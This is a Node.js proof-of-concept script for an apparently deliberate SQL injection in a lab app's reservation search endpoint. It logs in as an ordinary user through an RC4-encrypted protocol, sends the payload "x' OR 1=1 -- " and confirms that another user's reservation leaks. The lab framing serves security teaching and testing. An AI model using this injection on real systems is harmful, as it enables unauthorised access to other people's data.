#!/usr/bin/env node
'use strict';

/*
 * poc-v2-sqli.js — proof-of-concept for lab vulnerability V2 (intentional
 * SQL injection in POST /api/reservations/search).
 *
 * Runs the full encrypted-protocol cycle as an ORDINARY user (bob) and
 * shows that the injected `q` returns a reservation belonging to alice —
 * the seeded victim row (id 13, EQ-1002, "Senior project: DNA sequencer
 * calibration") that bob can neither list nor retrieve legitimately.
 *
 * Steps demonstrated (all inside the RC4 envelope — never plaintext):
 *   1. POST /api/session/key        (fresh RC4 session)
 *   2. keep sid + key
 *   3. POST /api/auth/login         (as bob / StudentPass!23)
 *   4. POST /api/reservations/search  q = "DNA"           (control)
 *   5. same endpoint                  q = "x' OR 1=1 -- "  (injection)
 *   6. decrypt response envelope
 *   7. assert alice's reservation is present in the decrypted rows
 *
 * Usage:
 *   node scripts/poc-v2-sqli.js [--base http://127.0.0.1:3000]
 */
const LabRC4 = require('../shared/protocol/rc4.js');
const LabEnvelope = require('../shared/protocol/envelope.js');

const BASE = (process.argv.includes('--base')
  ? process.argv[process.argv.indexOf('--base') + 1]
  : process.env.LAB_BASE) || 'http://127.0.0.1:3000';

const VICTIM = {
  id: 13,
  ownerUsername: 'alice',
  assetTag: 'EQ-1002',
  startsAt: '2026-10-06T09:00:00.000Z',
  purpose: 'Senior project: DNA sequencer calibration',
  status: 'active'
};

function section(title) {
  console.log('\n=== ' + title + ' ===');
}

async function main() {
  section('1-2. POST /api/session/key (fresh RC4 session over plaintext HTTP)');
  const keyRes = await fetch(BASE + '/api/session/key', { method: 'POST' });
  const session = await keyRes.json();
  if (!keyRes.ok || !session.sessionId || !session.key) {
    throw new Error('session/key failed: HTTP ' + keyRes.status + ' ' + JSON.stringify(session));
  }
  console.log(`sessionId: ${session.sessionId}`);
  console.log(`key (Base64, readable — documented protocol weakness): ${session.key}`);

  async function call(endpoint, payload) {
    const res = await fetch(BASE + endpoint, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(LabEnvelope.seal(session.sessionId, session.key, payload))
    });
    const raw = await res.json();
    if (raw && raw.data) {
      return { status: res.status, body: LabEnvelope.open(session.key, raw) };
    }
    return { status: res.status, body: raw }; // plaintext protocol error
  }

  section("3. POST /api/auth/login as 'bob' (ordinary student — not alice)");
  const login = await call('/api/auth/login', { username: 'bob', password: 'StudentPass!23' });
  if (login.status !== 200 || !login.body.token) {
    throw new Error('login failed: HTTP ' + login.status + ' ' + JSON.stringify(login.body));
  }
  const token = login.body.token;
  console.log(`logged in as: ${login.body.user.username} (role ${login.body.user.role})`);
  console.log(`app token: ${token}`);

  section('4. Control: encrypted search q = "DNA" (normal behaviour for bob)');
  const control = await call('/api/reservations/search', { token, q: 'DNA' });
  if (control.status !== 200) {
    throw new Error('control search failed: HTTP ' + control.status + ' ' + JSON.stringify(control.body));
  }
  console.log(`matches returned: ${control.body.length} (bob has no DNA reservation — none expected)`);

  section("5-6. Injection: encrypted search q = \"x' OR 1=1 -- \" (decrypting response)");
  const inject = await call('/api/reservations/search', { token, q: "x' OR 1=1 -- " });
  if (inject.status !== 200) {
    throw new Error('injected search failed: HTTP ' + inject.status + ' ' + JSON.stringify(inject.body));
  }
  console.log(`matches returned: ${inject.body.length}`);
  const victim = inject.body.find((r) => r.id === VICTIM.id);
  console.log('\nvictim row found in decrypted response:');
  console.log(JSON.stringify(victim, null, 2));

  section('7. Proof check');
  const proofs = [
    ['reservation ID', victim && victim.id === VICTIM.id, victim && victim.id],
    ['owner username (another user!)', victim && victim.ownerUsername === VICTIM.ownerUsername, victim && victim.ownerUsername],
    ['owner display name', victim && typeof victim.ownerDisplayName === 'string', victim && victim.ownerDisplayName],
    ['equipment', victim && victim.assetTag === VICTIM.assetTag, victim && victim.assetTag],
    ['date/time', victim && victim.startsAt === VICTIM.startsAt, victim && victim.startsAt],
    ['purpose', victim && victim.purpose === VICTIM.purpose, victim && victim.purpose],
    ['status', victim && victim.status === VICTIM.status, victim && victim.status]
  ];
  let ok = true;
  for (const [label, pass, shown] of proofs) {
    console.log(`${pass ? 'PASS' : 'FAIL'}  ${label}: ${JSON.stringify(shown)}`);
    ok = ok && pass;
  }
  // The control must NOT have leaked the row; the injection MUST have.
  ok = ok && !control.body.some((r) => r.id === VICTIM.id);

  if (!ok) {
    console.error('\nPOC FAILED — expected cross-user leak not observed');
    process.exit(1);
  }
  console.log('\nPOC OK — V2 confirmed: SQL injection via POST /api/reservations/search {q}');
  console.log("returned alice's reservation (id 13) to an authenticated ordinary user (bob).");
}

main().catch((err) => {
  console.error('[poc-v2-sqli] ' + err.message);
  process.exit(1);
});
